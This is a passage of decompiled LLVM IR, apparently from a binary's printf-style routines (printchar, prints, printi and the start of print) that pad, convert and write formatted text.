  %v5_84ac = icmp slt i32 %v1_8498, %stack_var_-24.0
  br i1 %v5_84ac, label %dec_label_pc_8520.preheader, label %dec_label_pc_84b0

dec_label_pc_84b0:                                ; preds = %dec_label_pc_84a0.preheader, %dec_label_pc_8494
  %stack_var_-20.012 = phi i32 [ %v1_8498, %dec_label_pc_8494 ], [ %v1_8450, %dec_label_pc_84a0.preheader ]
  %v2_84bc = add i32 %stack_var_-20.012, %tmp
  %v1_84c0 = inttoptr i32 %v2_84bc to i8*
  %v2_84c0 = load i8, i8* %v1_84c0, align 1
  %v3_84c0 = zext i8 %v2_84c0 to i32
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  %v1_84c8 = call i32 @isspace(i32 %v3_84c0)
  store i32 %v1_84c8, i32* %r0.global-to-local, align 4
  %v2_84d0 = icmp eq i32 %v1_84c8, 0
  br i1 %v2_84d0, label %dec_label_pc_8520.preheader, label %dec_label_pc_8494

dec_label_pc_8520.preheader:                      ; preds = %dec_label_pc_8494, %dec_label_pc_84b0, %dec_label_pc_84a0.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8450, %dec_label_pc_84a0.preheader ], [ %v1_8498, %dec_label_pc_8494 ], [ %stack_var_-20.012, %dec_label_pc_84b0 ]
  br label %dec_label_pc_8520

dec_label_pc_84e4:                                ; preds = %dec_label_pc_8520
  %v2_8508 = add i32 %storemerge2, %tmp
  %v1_850c = inttoptr i32 %v2_8508 to i8*
  %v2_850c = load i8, i8* %v1_850c, align 1
  %v3_8510 = inttoptr i32 %v2_8544 to i8*
  store i8 %v2_850c, i8* %v3_8510, align 1
  %v1_8518 = add i32 %storemerge2, 1
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520.preheader, %dec_label_pc_84e4
  %storemerge2 = phi i32 [ %v1_8518, %dec_label_pc_84e4 ], [ %stack_var_-24.0, %dec_label_pc_8520.preheader ]
  %v7_852c = icmp sgt i32 %storemerge2, %stack_var_-20.0.lcssa
  %v2_8538 = sub i32 %storemerge2, %stack_var_-24.0
  %v2_8544 = add i32 %v2_8538, %tmp
  br i1 %v7_852c, label %dec_label_pc_8530, label %dec_label_pc_84e4

dec_label_pc_8530:                                ; preds = %dec_label_pc_8520
  %v3_854c = inttoptr i32 %v2_8544 to i8*
  store i8 0, i8* %v3_854c, align 1
  %v1_8558 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_8558

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8450, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8520, { 1, 0 }
  uselistorder label %dec_label_pc_8520.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_84b0, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_8568 = ptrtoint i32* %stack_var_-24 to i32
  %v0_856c = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8578 = icmp eq i32 %v0_856c, 0
  br i1 %v2_8578, label %dec_label_pc_85ac, label %dec_label_pc_8580

dec_label_pc_8580:                                ; preds = %entry
  %v1_8584 = inttoptr i32 %v0_856c to i32*
  %v2_8584 = load i32, i32* %v1_8584, align 4
  %v1_8590 = trunc i32 %arg2 to i8
  %v3_8590 = inttoptr i32 %v2_8584 to i8*
  store i8 %v1_8590, i8* %v3_8590, align 1
  %v2_8598 = load i32, i32* %v1_8584, align 4
  %v1_859c = add i32 %v2_8598, 1
  store i32 %v1_859c, i32* %v1_8584, align 4
  %v1_85c8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85c0

dec_label_pc_85ac:                                ; preds = %entry
  store i32 %v2_8568, i32* @r3, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v2_85bc = call i32 @__GI___libc_write(i32 1, i32 %v2_8568)
  store i32 %v2_85bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %dec_label_pc_8580, %dec_label_pc_85ac
  %v1_85c8 = phi i32 [ %v1_85c8.pre, %dec_label_pc_8580 ], [ %v2_85bc, %dec_label_pc_85ac ]
  ret i32 %v1_85c8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_85c0, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %v3_85d0 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp41 = icmp slt i32 %arg3, 1
  br i1 %tmp41, label %dec_label_pc_8688, label %dec_label_pc_8608

dec_label_pc_8608:                                ; preds = %entry
  %v2_863818 = load i8, i8* %arg2, align 1
  %v2_863c20 = icmp eq i8 %v2_863818, 0
  br i1 %v2_863c20, label %dec_label_pc_8644, label %dec_label_pc_861c

dec_label_pc_861c:                                ; preds = %dec_label_pc_8608, %dec_label_pc_861c
  %v4_863422 = phi i32 [ %v1_862c, %dec_label_pc_861c ], [ %tmp, %dec_label_pc_8608 ]
  %stack_var_-40.021 = phi i32 [ %v1_8620, %dec_label_pc_861c ], [ 0, %dec_label_pc_8608 ]
  %v1_8620 = add i32 %stack_var_-40.021, 1
  %v1_862c = add i32 %v4_863422, 1
  %v5_8630 = inttoptr i32 %v1_862c to i8*
  %v2_8638 = load i8, i8* %v5_8630, align 1
  %v2_863c = icmp eq i8 %v2_8638, 0
  br i1 %v2_863c, label %dec_label_pc_8644, label %dec_label_pc_861c

dec_label_pc_8644:                                ; preds = %dec_label_pc_861c, %dec_label_pc_8608
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_8608 ], [ %v1_8620, %dec_label_pc_861c ]
  %v5_8650 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_8650, label %dec_label_pc_8660, label %dec_label_pc_8670

dec_label_pc_8660:                                ; preds = %dec_label_pc_8644
  %v2_8668 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8670

dec_label_pc_8670:                                ; preds = %dec_label_pc_8644, %dec_label_pc_8660
  %storemerge2 = phi i32 [ %v2_8668, %dec_label_pc_8660 ], [ 0, %dec_label_pc_8644 ]
  %v1_8674 = and i32 %arg4, 2
  %v2_8678 = icmp eq i32 %v1_8674, 0
  br i1 %v2_8678, label %dec_label_pc_8688, label %dec_label_pc_8680

dec_label_pc_8680:                                ; preds = %dec_label_pc_8670
  br label %dec_label_pc_8688

dec_label_pc_8688:                                ; preds = %dec_label_pc_8670, %entry, %dec_label_pc_8680
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge2, %dec_label_pc_8670 ], [ %storemerge2, %dec_label_pc_8680 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8670 ], [ 48, %dec_label_pc_8680 ]
  %v1_868c = urem i32 %arg4, 2
  %v2_8690 = icmp eq i32 %v1_868c, 0
  br i1 %v2_8690, label %dec_label_pc_86c0.preheader, label %dec_label_pc_86fc.preheader

dec_label_pc_86c0.preheader:                      ; preds = %dec_label_pc_8688
  %v5_86c815 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_86c815, label %dec_label_pc_869c.lr.ph, label %dec_label_pc_86fc.preheader

dec_label_pc_869c.lr.ph:                          ; preds = %dec_label_pc_86c0.preheader
  %v2_86a4 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_869c

dec_label_pc_869c:                                ; preds = %dec_label_pc_869c.lr.ph, %dec_label_pc_869c
  %stack_var_-28.116 = phi i32 [ %stack_var_-28.0, %dec_label_pc_869c.lr.ph ], [ %v1_86b8, %dec_label_pc_869c ]
  %v3_86a4 = call i32 @printchar(i32* %v2_86a4, i32 %stack_var_-44.0)
  %v3_86a8 = load i32, i32* %stack_var_-48, align 4
  %v1_86ac = add i32 %v3_86a8, 1
  store i32 %v1_86ac, i32* %stack_var_-48, align 4
  %v1_86b8 = add nsw i32 %stack_var_-28.116, -1
  %v5_86c8 = icmp sgt i32 %stack_var_-28.116, 1
  br i1 %v5_86c8, label %dec_label_pc_869c, label %dec_label_pc_86fc.preheader

dec_label_pc_86fc.preheader:                      ; preds = %dec_label_pc_869c, %dec_label_pc_86c0.preheader, %dec_label_pc_8688
  %v3_874026 = phi i32 [ 0, %dec_label_pc_8688 ], [ 0, %dec_label_pc_86c0.preheader ], [ %v1_86ac, %dec_label_pc_869c ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8688 ], [ %stack_var_-28.0, %dec_label_pc_86c0.preheader ], [ 0, %dec_label_pc_869c ]
  %v2_87008 = load i8, i8* %arg2, align 1
  %v2_870410 = icmp eq i8 %v2_87008, 0
  br i1 %v2_870410, label %dec_label_pc_8734.preheader, label %dec_label_pc_86d0.lr.ph

dec_label_pc_86d0.lr.ph:                          ; preds = %dec_label_pc_86fc.preheader
  %v2_86e0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86d0

dec_label_pc_86d0:                                ; preds = %dec_label_pc_86d0.lr.ph, %dec_label_pc_86d0
  %v4_86fc12 = phi i32 [ %tmp, %dec_label_pc_86d0.lr.ph ], [ %v1_86f4, %dec_label_pc_86d0 ]
  %stack_var_-24.011 = phi i8* [ %arg2, %dec_label_pc_86d0.lr.ph ], [ %v5_86f8, %dec_label_pc_86d0 ]
  %v2_86d4 = load i8, i8* %stack_var_-24.011, align 1
  %v3_86d4 = zext i8 %v2_86d4 to i32
  %v3_86e0 = call i32 @printchar(i32* %v2_86e0, i32 %v3_86d4)
  %v3_86e4 = load i32, i32* %stack_var_-48, align 4
  %v1_86e8 = add i32 %v3_86e4, 1
  store i32 %v1_86e8, i32* %stack_var_-48, align 4
  %v1_86f4 = add i32 %v4_86fc12, 1
  %v5_86f8 = inttoptr i32 %v1_86f4 to i8*
  %v2_8700 = load i8, i8* %v5_86f8, align 1
  %v2_8704 = icmp eq i8 %v2_8700, 0
  br i1 %v2_8704, label %dec_label_pc_8734.preheader, label %dec_label_pc_86d0

dec_label_pc_8734.preheader:                      ; preds = %dec_label_pc_86d0, %dec_label_pc_86fc.preheader
  %v3_874025 = phi i32 [ %v3_874026, %dec_label_pc_86fc.preheader ], [ %v1_86e8, %dec_label_pc_86d0 ]
  %v5_873c5 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_873c5, label %dec_label_pc_8710.lr.ph, label %dec_label_pc_8740

dec_label_pc_8710.lr.ph:                          ; preds = %dec_label_pc_8734.preheader
  %v2_8718 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8710

dec_label_pc_8710:                                ; preds = %dec_label_pc_8710.lr.ph, %dec_label_pc_8710
  %stack_var_-28.36 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_8710.lr.ph ], [ %v1_872c, %dec_label_pc_8710 ]
  %v3_8718 = call i32 @printchar(i32* %v2_8718, i32 %stack_var_-44.0)
  %v3_871c = load i32, i32* %stack_var_-48, align 4
  %v1_8720 = add i32 %v3_871c, 1
  store i32 %v1_8720, i32* %stack_var_-48, align 4
  %v1_872c = add nsw i32 %stack_var_-28.36, -1
  %v5_873c = icmp sgt i32 %stack_var_-28.36, 1
  br i1 %v5_873c, label %dec_label_pc_8710, label %dec_label_pc_8740

dec_label_pc_8740:                                ; preds = %dec_label_pc_8710, %dec_label_pc_8734.preheader
  %v3_8740 = phi i32 [ %v3_874025, %dec_label_pc_8734.preheader ], [ %v1_8720, %dec_label_pc_8710 ]
  store i32 %v3_85d0, i32* @fp, align 4
  ret i32 %v3_8740

; uselistorder directives
  uselistorder i32 %v1_86f4, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_862c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8710, { 1, 0 }
  uselistorder label %dec_label_pc_86d0, { 1, 0 }
  uselistorder label %dec_label_pc_869c, { 1, 0 }
  uselistorder label %dec_label_pc_8688, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8670, { 1, 0 }
  uselistorder label %dec_label_pc_861c, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_8758 = load i32, i32* @fp, align 4
  store i32 34656, i32* %stack_var_-4, align 4
  %v2_875c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_875c, i32* @fp, align 4
  %v1_8790 = icmp slt i32 %arg2, 0
  %v2_8790 = icmp eq i32 %arg2, 0
  br i1 %v2_8790, label %dec_label_pc_8798, label %dec_label_pc_87cc

dec_label_pc_8798:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_87bc = bitcast i32* %stack_var_-28 to i8*
  %v6_87bc = call i32 @prints(i32 %arg1, i8* %v5_87bc, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_892c

dec_label_pc_87cc:                                ; preds = %entry
  %v2_87d0 = icmp eq i32 %arg4, 0
  br i1 %v2_87d0, label %dec_label_pc_8804, label %dec_label_pc_87d8

dec_label_pc_87d8:                                ; preds = %dec_label_pc_87cc
  %v7_87dc = icmp eq i32 %arg3, 10
  br i1 %v7_87dc, label %dec_label_pc_87e4, label %dec_label_pc_8804

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87d8
  br i1 %v1_8790, label %dec_label_pc_87f0, label %dec_label_pc_8804

dec_label_pc_87f0:                                ; preds = %dec_label_pc_87e4
  %v1_87fc = sub i32 0, %arg2
  br label %dec_label_pc_8804

dec_label_pc_8804:                                ; preds = %dec_label_pc_87e4, %dec_label_pc_87d8, %dec_label_pc_87cc, %dec_label_pc_87f0
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_87cc ], [ %v1_87fc, %dec_label_pc_87f0 ], [ %arg2, %dec_label_pc_87e4 ], [ %arg2, %dec_label_pc_87d8 ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_87cc ], [ 1, %dec_label_pc_87f0 ], [ 0, %dec_label_pc_87e4 ], [ 0, %dec_label_pc_87d8 ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_88984 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_88984, label %dec_label_pc_88a0, label %dec_label_pc_8820.lr.ph

dec_label_pc_8820.lr.ph:                          ; preds = %dec_label_pc_8804
  %v1_8848 = add i32 %arg7, -58
  br label %dec_label_pc_8820

dec_label_pc_8820:                                ; preds = %dec_label_pc_8820.lr.ph, %dec_label_pc_8858
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_8820.lr.ph ], [ %v2_882c, %dec_label_pc_8858 ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_8820.lr.ph ], [ %v5_8860, %dec_label_pc_8858 ]
  %v2_882c = udiv i32 %stack_var_-52.16, %arg3
  %v3_882c = urem i32 %stack_var_-52.16, %arg3
  %v7_8840 = icmp slt i32 %v3_882c, 10
  br i1 %v7_8840, label %dec_label_pc_8858, label %dec_label_pc_8844

dec_label_pc_8844:                                ; preds = %dec_label_pc_8820
  %v2_8850 = add i32 %v3_882c, %v1_8848
  br label %dec_label_pc_8858

dec_label_pc_8858:                                ; preds = %dec_label_pc_8820, %dec_label_pc_8844
  %stack_var_-64.0 = phi i32 [ %v3_882c, %dec_label_pc_8820 ], [ %v2_8850, %dec_label_pc_8844 ]
  %v4_8858 = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_885c = add i32 %v4_8858, -1
  %v5_8860 = inttoptr i32 %v1_885c to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_8878 = trunc i32 %fold to i8
  store i8 %v1_8878, i8* %v5_8860, align 1
  %v2_8898 = icmp ult i32 %stack_var_-52.16, %arg3
  br i1 %v2_8898, label %dec_label_pc_88a0, label %dec_label_pc_8820

dec_label_pc_88a0:                                ; preds = %dec_label_pc_8858, %dec_label_pc_8804
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_8804 ], [ %v5_8860, %dec_label_pc_8858 ]
  %v2_88a4 = icmp eq i32 %stack_var_-60.0, 0
  br i1 %v2_88a4, label %dec_label_pc_8908, label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_88a0
  %v3_88ac = load i32, i32* %stack_var_0, align 4
  %v2_88b0 = icmp eq i32 %v3_88ac, 0
  br i1 %v2_88b0, label %dec_label_pc_88f0, label %dec_label_pc_88b8

dec_label_pc_88b8:                                ; preds = %dec_label_pc_88ac
  %v1_88bc = and i32 %arg6, 2
  %v2_88c0 = icmp eq i32 %v1_88bc, 0
  br i1 %v2_88c0, label %dec_label_pc_88f0, label %dec_label_pc_88c8

dec_label_pc_88c8:                                ; preds = %dec_label_pc_88b8
  %v2_88d0 = inttoptr i32 %arg1 to i32*
  %v3_88d0 = call i32 @printchar(i32* %v2_88d0, i32 45)
  %v3_88e0 = load i32, i32* %stack_var_0, align 4
  %v1_88e4 = add i32 %v3_88e0, -1
  store i32 %v1_88e4, i32* %stack_var_0, align 4
  br label %dec_label_pc_8908

dec_label_pc_88f0:                                ; preds = %dec_label_pc_88b8, %dec_label_pc_88ac
  %v4_88f0 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_88f4 = add i32 %v4_88f0, -1
  %v5_88f8 = inttoptr i32 %v1_88f4 to i8*
  store i8 45, i8* %v5_88f8, align 1
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_88a0, %dec_label_pc_88c8, %dec_label_pc_88f0
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_88a0 ], [ %v5_88f8, %dec_label_pc_88f0 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_88c8 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_88a0 ], [ 0, %dec_label_pc_88f0 ], [ 1, %dec_label_pc_88c8 ]
  %v3_8910 = load i32, i32* %stack_var_0, align 4
  %v6_8918 = call i32 @prints(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_8910, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8924 = add i32 %v6_8918, %stack_var_-56.0
  br label %dec_label_pc_892c

dec_label_pc_892c:                                ; preds = %dec_label_pc_8798, %dec_label_pc_8908
  %storemerge2 = phi i32 [ %v2_8924, %dec_label_pc_8908 ], [ %v6_87bc, %dec_label_pc_8798 ]
  store i32 %v3_8758, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8860, { 0, 2, 1 }
  uselistorder i32 %v3_882c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_892c, { 1, 0 }
  uselistorder label %dec_label_pc_8908, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8858, { 1, 0 }
  uselistorder label %dec_label_pc_8820, { 1, 0 }
  uselistorder label %dec_label_pc_8804, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 35148, i32* %stack_var_-4, align 4
  %v2_8948 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8948, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_8cf429 = load i8, i8* %stack_var_-32.428, align 1
  %v2_8cf831 = icmp eq i8 %v2_8cf429, 0
  br i1 %v2_8cf831, label %dec_label_pc_8d00, label %dec_label_pc_8968.lr.ph

dec_label_pc_8968.lr.ph:                          ; preds = %entry
  %v5_8cac = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8968

dec_label_pc_8968:                                ; preds = %dec_label_pc_8968.lr.ph, %dec_label_pc_8ce4
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_8968.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_8ce4 ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_8968.lr.ph ], [ %v1_8ce8, %dec_label_pc_8ce4 ]
  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_8968.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_8ce4 ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_8968.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_8ce4 ]
  %v2_896c = load i8, i8* %stack_var_-32.435, align 1
  %v7_8970 = icmp eq i8 %v2_896c, 37
  br i1 %v7_8970, label %dec_label_pc_8978, label %dec_label_pc_8cc4

dec_label_pc_8978:                                ; preds = %dec_label_pc_8968
  %v1_897c = add i32 %stack_var_-32.4.in34, 1
  %v5_8980 = inttoptr i32 %v1_897c to i8*
  %v2_8998 = load i8, i8* %v5_8980, align 1
  %v2_899c = icmp eq i8 %v2_8998, 0
  br i1 %v2_899c, label %dec_label_pc_8d00, label %dec_label_pc_89a4

dec_label_pc_89a4:                                ; preds = %dec_label_pc_8978
  %v2_89a8 = load i8, i8* %v5_8980, align 1
  %v7_89ac = icmp eq i8 %v2_89a8, 37
  br i1 %v7_89ac, label %dec_label_pc_8cc4, label %dec_label_pc_89b4

dec_label_pc_89b4:                                ; preds = %dec_label_pc_89a4
  %v2_89b8 = load i8, i8* %v5_8980, align 1
  %v7_89bc = icmp eq i8 %v2_89b8, 45
  br i1 %v7_89bc, label %dec_label_pc_89c4, label %dec_label_pc_89f4.preheader

dec_label_pc_89c4:                                ; preds = %dec_label_pc_89b4
  %v1_89c8 = add i32 %stack_var_-32.4.in34, 2
  %v5_89cc = inttoptr i32 %v1_89c8 to i8*
  br label %dec_label_pc_89f4.preheader

dec_label_pc_89f4.preheader:                      ; preds = %dec_label_pc_89c4, %dec_label_pc_89b4
  %stack_var_-32.0.ph = phi i8* [ %v5_8980, %dec_label_pc_89b4 ], [ %v5_89cc, %dec_label_pc_89c4 ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_89b4 ], [ 1, %dec_label_pc_89c4 ]
  %v4_89f42 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_89f83 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_89fc7 = icmp eq i8 %v2_89f83, 48
  br i1 %v7_89fc7, label %dec_label_pc_89dc, label %dec_label_pc_8a40.preheader

dec_label_pc_89dc:                                ; preds = %dec_label_pc_89f4.preheader, %dec_label_pc_89dc
  %v4_89f49 = phi i32 [ %v1_89e0, %dec_label_pc_89dc ], [ %v4_89f42, %dec_label_pc_89f4.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_89ec, %dec_label_pc_89dc ], [ %stack_var_-48.0.ph, %dec_label_pc_89f4.preheader ]
  %v1_89e0 = add i32 %v4_89f49, 1
  %v5_89e4 = inttoptr i32 %v1_89e0 to i8*
  %v1_89ec = or i32 %stack_var_-48.08, 2
  %v2_89f8 = load i8, i8* %v5_89e4, align 1
  %v7_89fc = icmp eq i8 %v2_89f8, 48
  br i1 %v7_89fc, label %dec_label_pc_89dc, label %dec_label_pc_8a40.preheader

dec_label_pc_8a40.preheader:                      ; preds = %dec_label_pc_89dc, %dec_label_pc_89f4.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_89f4.preheader ], [ %v1_89ec, %dec_label_pc_89dc ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_89f4.preheader ], [ %v5_89e4, %dec_label_pc_89dc ]
  %v4_8a4011 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_8a4412 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8a4412, 48
  br i1 %tmp60, label %dec_label_pc_8a60, label %dec_label_pc_8a50

dec_label_pc_8a08:                                ; preds = %dec_label_pc_8a50
  %v2_8a14 = mul i32 %stack_var_-52.019, 10
  %v2_8a20 = load i8, i8* %stack_var_-32.120, align 1
  %v3_8a20 = zext i8 %v2_8a20 to i32
  %v1_8a24 = add i32 %v2_8a14, -48
  %v2_8a2c = add i32 %v1_8a24, %v3_8a20
  %v1_8a38 = add i32 %v4_8a4021, 1
  %v5_8a3c = inttoptr i32 %v1_8a38 to i8*
  %v2_8a44 = load i8, i8* %v5_8a3c, align 1
  %tmp61 = icmp ult i8 %v2_8a44, 48
  br i1 %tmp61, label %dec_label_pc_8a60, label %dec_label_pc_8a50

dec_label_pc_8a50:                                ; preds = %dec_label_pc_8a40.preheader, %dec_label_pc_8a08
  %v4_8a4021 = phi i32 [ %v1_8a38, %dec_label_pc_8a08 ], [ %v4_8a4011, %dec_label_pc_8a40.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_8a3c, %dec_label_pc_8a08 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8a40.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_8a2c, %dec_label_pc_8a08 ], [ 0, %dec_label_pc_8a40.preheader ]
  %v2_8a54 = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_8a54, 58
  br i1 %tmp62, label %dec_label_pc_8a08, label %dec_label_pc_8a60

dec_label_pc_8a60:                                ; preds = %dec_label_pc_8a08, %dec_label_pc_8a50, %dec_label_pc_8a40.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_8a40.preheader ], [ %v2_8a2c, %dec_label_pc_8a08 ], [ %stack_var_-52.019, %dec_label_pc_8a50 ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_8a40.preheader ], [ %v5_8a3c, %dec_label_pc_8a08 ], [ %stack_var_-32.120, %dec_label_pc_8a50 ]
  %v2_8a64 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8a68 = icmp eq i8 %v2_8a64, 115
  br i1 %v7_8a68, label %dec_label_pc_8a70, label %dec_label_pc_8ad4

dec_label_pc_8a70:                                ; preds = %dec_label_pc_8a60
  %v1_8a74 = add i32 %stack_var_-36.133, 4
  %v1_8a80 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8a80 = load i32, i32* %v1_8a80, align 4
  %v2_8a8c = icmp eq i32 %v2_8a80, 0
  br i1 %v2_8a8c, label %dec_label_pc_8aa0, label %dec_label_pc_8a94

dec_label_pc_8a94:                                ; preds = %dec_label_pc_8a70
  %v5_8a98 = inttoptr i32 %v2_8a80 to i8*
  br label %dec_label_pc_8aa8

dec_label_pc_8aa0:                                ; preds = %dec_label_pc_8a70
  br label %dec_label_pc_8aa8

dec_label_pc_8aa8:                                ; preds = %dec_label_pc_8a94, %dec_label_pc_8aa0
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23654.39, i32 0, i32 0), %dec_label_pc_8aa0 ], [ %v5_8a98, %dec_label_pc_8a94 ]
  %v7_8abc = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8ac8 = add i32 %v7_8abc, %stack_var_-44.132
  br label %dec_label_pc_8ce4

dec_label_pc_8ad4:                                ; preds = %dec_label_pc_8a60
  %v2_8ad8 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8adc = icmp eq i8 %v2_8ad8, 100
  br i1 %v7_8adc, label %dec_label_pc_8ae4, label %dec_label_pc_8b38

dec_label_pc_8ae4:                                ; preds = %dec_label_pc_8ad4
  %v1_8ae8 = add i32 %stack_var_-36.133, 4
  %v1_8af4 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8af4 = load i32, i32* %v1_8af4, align 4
  %v7_8b20 = call i32 @printi(i32 %tmp, i32 %v2_8af4, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b2c = add i32 %v7_8b20, %stack_var_-44.132
  br label %dec_label_pc_8ce4

